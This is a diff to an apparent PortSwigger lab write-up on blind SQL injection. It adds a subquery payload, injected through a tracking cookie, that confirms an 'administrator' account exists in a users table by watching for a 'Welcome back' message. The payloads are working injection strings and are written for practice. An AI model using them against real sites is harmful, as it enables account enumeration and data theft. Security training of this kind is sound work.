@@ -31,3 +31,15 @@ SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '
 SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=2-- '
 ```
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8490db5d-55ae-4aaa-8924-0aee2f53704e)
+
+#### Check Whether the username administrator is present in users table -
+
+```Here table name is users```
+
+```sql
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'Ananthan' FROM users WHERE username='administrator')='Ananthan
+```
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/88dbcb08-b121-47a8-8b20-cad203b083d4)
+
+It display the Welcome back message. So username administrator  is present in the user table.
